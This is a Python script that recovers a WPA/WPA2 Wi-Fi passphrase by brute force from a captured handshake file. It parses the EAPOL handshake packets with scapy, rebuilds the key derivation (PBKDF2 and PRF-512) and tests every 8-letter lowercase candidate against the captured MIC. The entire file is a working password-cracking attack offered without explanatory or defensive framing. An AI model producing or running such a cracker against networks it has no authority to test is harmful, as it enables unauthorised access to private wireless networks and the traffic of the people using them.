#!/usr/bin/python3
import hmac,hashlib,binascii
from pbkdf2 import PBKDF2
from scapy.all import *
from wpa import *
import itertools,string,subprocess,sys

def PRF512(pmk,A,B):
    i=0
    r=b''
    while i!=4:
        concat=A+chr(0x00).encode()+B+chr(i).encode()
        hMac=hmac.new(pmk,digestmod=hashlib.sha1)
        hMac.update(concat)
        r=r+hMac.digest()
        i+=1
    return r[:64]



def passcrack(mic,A,B,final_pkt,ssid,version):
    chars = string.ascii_lowercase
    attemps = 0
    for guess in itertools.product(chars, repeat=8):
        guess = ''.join(guess)
        attemps+=1
        f=PBKDF2(guess,ssid,4096)
        pmk=f.read(32)
        PTK=PRF512(pmk,A,B)
        KCK=PTK[:16]
        if version==1:
            hMac=hmac.new(KCK,digestmod=hashlib.md5)
        else:
            hMac=hmac.new(KCK,digestmod=hashlib.sha1)
        hMac.update(bytes(final_pkt))
        testMic=hMac.digest()
        print(guess)
        if(mic==testMic):
            print("Password Cracked in %d attemps:"%attemps,guess)
            return


pcap = rdpcap("capture_wpa.pcap")
eapol = pcap.filter(lambda p: EAPOL in p)

pkt0 = pcap[0]
pkt1 = eapol[0]
pkt2 = eapol[1]
pkt3 = eapol[2]
pkt4 = eapol[3]

ssid = pkt0.info.decode()

src_mac = pkt1.addr2
dst_mac = pkt2.addr2

anonce = pkt3.nonce
snonce = pkt2.nonce

mic = pkt4.wpa_key_mic

final_pkt=pkt4[EAPOL]
final_pkt.wpa_key_mic=0
src_mac = src_mac.split(":")
src_mac = ''.join(src_mac)
dst_mac = dst_mac.split(":")
dst_mac = ''.join(dst_mac)

src_mac = bytes.fromhex(src_mac)
dst_mac = bytes.fromhex(dst_mac)

B=min(src_mac, dst_mac) + max(src_mac, dst_mac) + min(anonce, snonce) + max(anonce, snonce)
A=b'Pairwise key expansion'
version=pkt1.key_descriptor_Version
passcrack(mic,A,B,final_pkt,ssid,version)

